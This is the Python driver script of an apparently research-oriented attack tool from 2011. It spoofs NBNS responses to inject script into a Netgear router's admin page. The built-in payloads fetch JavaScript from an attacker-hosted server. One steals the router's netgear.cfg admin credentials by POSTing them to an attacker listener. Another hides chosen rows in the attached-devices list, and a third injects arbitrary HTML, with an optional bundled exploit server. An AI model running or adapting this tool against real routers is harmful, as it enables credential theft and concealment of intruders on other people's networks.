#!/usr/bin/env python
#
# driver.py: NBNS injection driver for nbns_injector.py and nbns_server.py
# Copyright (C) 2011 Simon Weber <sweb090@gmail.com>
# Code published under GPLv2; see LICENSE file

import sys
import getopt
import threading

import nbns_server
import nbns_injector

def main():
   ### Set up command line options. Adding more options is possible by just adding them here and handling down below. ###

   #Singleton switches. All optional, and false by default, their presence sets their value to true.
   s_switch_to_name = { 'v': 'verbose',\
                        's': 'autorun_server'}

   switch_to_name = {   'r': 'router_ip', \
                        'i': 'interface', \
                        'a': 'actual_ip', \
                        'f': 'fake_ip_seed', \
                        'h': 'hosting_server', \
                        'm': 'fake_mac_seed', \
                        't': 'attack_type', \
                        'l': 'listening_server', \
                        'c': 'payload', \
                        'd': 'hide_terms'}

   required_switches = ['r', 'i', 'a', 'f', 't']

   translate_switch = (lambda s: switch_to_name[s] if s in switch_to_name.keys() else s_switch_to_name[s])

   required_names = map(translate_switch, required_switches)

   #Attack type number -> (external javascript file name, list of acceptable switch name sets)
   #For unhosted exploits, javascript = None
   translate_switch_list = (lambda l : map(translate_switch, l))

   attack_types = {  '0': (None, map(translate_switch_list, ('c',))), \
                    '1': ('steal_admin.js', map(translate_switch_list, (('l', 'h'), ('s',)))), \
                    '2': ('hide_rows.js', map(translate_switch_list, (('d', 's'), ('d', 'h'))))}   


   ### Read in options. ###
   try:
      opts, args = getopt.getopt(sys.argv[1:],"".join(s_switch_to_name.keys()) + \
                                 ":".join(switch_to_name.keys()) + ":")
   except:
      quit_for_bad_usage("Invalid options.")

   options = {} # {'name' -> 'arg'}

   for o, a in opts:
      #Pull off leading '-'
      switch = o[1] 

      if switch in s_switch_to_name.keys():
         options[s_switch_to_name[switch]] = True
      elif switch in switch_to_name.keys():
         options[switch_to_name[switch]] = a
      else:
         #This should never happen, it would get caught when calling getopt.
         quit_for_bad_usage("Invalid option: " + o)


   ### Ensure proper usage. ###

   #Don't allow leftover args.
   if args:
      quit_for_bad_usage("Leftover argument(s)")

   #Ensure required switches are there.
   if not set(required_names).issubset(set(options.keys())):
      quit_for_bad_usage("Missing required option(s)")

   #Ensure attack type specific args are there (one of the potential required sets should be a subset of what we received from the user).
   if not True in map( (lambda req: set(req).issubset(set(options.keys()))), \
                      attack_types[options['attack_type']][1]):
      quit_for_bad_usage("Missing required attack-specific option(s)")


   
   ### Set default options. ###

   if not 'fake_mac_seed' in options.keys():
      options['fake_mac_seed'] = "00:00:00:00:00:00"
   else:
      #inc_seq expects upper case mac.
      options['fake_mac_seed'] = options['fake_mac_seed'].upper()

   if not 'verbose' in options.keys():
      options['verbose'] = False
   if not 'autorun_server' in options.keys():
      options['autorun_server'] = False

   if options['autorun_server']:
      options['hosting_server'] = options['actual_ip']
      options['listening_server'] = options['actual_ip']


   ### Init options for building the injector. ###
   hosted_a_type_keys = filter(lambda key: attack_types[key][0] != None, attack_types.keys())

   #Build the payload for a built-in exploit.
   if options['attack_type'] in hosted_a_type_keys:

      ex_options = None
      if options['attack_type'] == '1':
         ex_options = '["{router_ip}", "{listening_url}"]'.format(router_ip=options['router_ip'], listening_url=options['listening_server'])
      else:
         ex_options = options['hide_terms']

      options['payload']="""<script src="http://{host}/exploit_js/{external_file}"></script><script>function loadhelp(fname, anchname){{loadhelp2(fname, anchname, {opt_array});}}</script>""" \
          .format(host=options['hosting_server'], \
                  external_file=attack_types[options['attack_type']][0], \
                  opt_array=ex_options)

   ip_inc = inc_seq(options['fake_ip_seed'], 'ip')
   mac_inc = inc_seq(options['fake_mac_seed'], 'mac')


   injector = nbns_injector.Injector(options['verbose'], ip_inc, mac_inc, options['actual_ip'], options['interface'], options['payload'], options['router_ip'])


   ### Run the injector, and if needed, the server. ###
   if options['autorun_server']:
      exploit_server = nbns_server.ExploitHTTPServer(('', 80), nbns_server.ExploitHTTPServer.ExploitRequestHandler)
      server_thread = threading.Thread(target=exploit_server.serve)

      print "Server starting:",
      server_thread.start()
      print "[done]"

      print "Injector started."
      #This blocks until control+c, when we just advance. KeyboardInterrupt is not raised.
      injector.run()
      print
      print "Injector stopped."

      print "Server stopping:",
      exploit_server.stop()
      print "[done]"

   else:
      print "Injector started."
      if options['attack_type'] in hosted_a_type_keys:
         print "(You're running a built-in exploit; if you're not hosting exploit code yourself, you probably want to use the built-in server with -s)"
         
      injector.run()
      print
      print "Injector stopped."
   
   return


def inc_seq(seed, seq_type):
   """A generator to increment through sequences.

   seq_type is one of 'mac' or 'ip'."""

   splitter, full, empty, inc = None, None, None, None

   if(seq_type == 'ip'):
      splitter, full, empty = '.', '255', '0'
      inc = lambda part: str(int(part) + 1)

   elif(seq_type == 'mac'):
      splitter, full, empty = ':', 'FF', '00'
      inc = lambda part: "%02X" % (int(part, 16) + 1)

   else:
      return

   overfull = inc(full)
   parts = seed.split(splitter)


   while(True):
      i = len(parts) - 1
      while(parts[i] == full and i > 0):
         parts[i] = empty
         i -= 1

      parts[i] = inc(parts[i])

      if(parts[0] == overfull):
         break

      yield splitter.join(parts)

def usage():
   print """Usage:
driver.py <required flags> -t <attack type number> <attack additional args> [optional flags]

###required flags###
-r <ip>
    The IP of the router to attack

-i <interface>
    The interface to sniff and send on

-a <ip>
    The actual IP of our listening interface

-f <ip>
    Seed for fake ips. Depending on the size of the payload, a large amount of unique, fake ips need to be generated. They will be created by incrementing this seed by 1 each time; choose an ip with room above it.

-t <attack type>
    Specify the exploit to use. See attack types section.


###attack types###
1: Steal admin credentials (steal_admin.js)
    Exploit will GET the netgear.cfg file and POST it to a listener. server.py is built for this purpose.

    required when not using -s:

    -l <listening server ip/tldn>
        The server that netgear.cfg will be POSTed to.
    -h <js hosting server ip/tldn>
        The server that hosts steal_admin.js

2: Hide rows in the device listing (hide_rows.js)
    Exploit will modify the attached devices list to hide rows with certain terms in them.

    additional args:

    -d <javascript list>
        A javascript list of search terms. Any row containing these will be removed.
        use this syntax: -d '["term 1", "term 2"]'

    required when not using -s:

    -h <js hosting server ip/tldn>
        The server that hosts hide_rows.js
    
0: User defined
    Inject arbitrary html to the page.

    additional args:

    -c <html>
        eg -c "<script>alert('test');</script>"
    

###optional flags###
-v 
    Turn on output of sniffed NBNS name queries and responses sent.

-s
    Autorun and use the built in server (nbns_server.py) for hosting and listening.

-m <MAC>
    Seed for fake MACs; used in the same way as the fake IP seed. Defaults to all zero; set this if you're running into another MAC.

-h <ip> | <tldn> 
    The ip or tldn where router.js is hosted. If not specified, argument to -a is used.
"""
   return

def quit_for_bad_usage(message):
   print
   print message
   print
   usage()
   exit(1)

main()
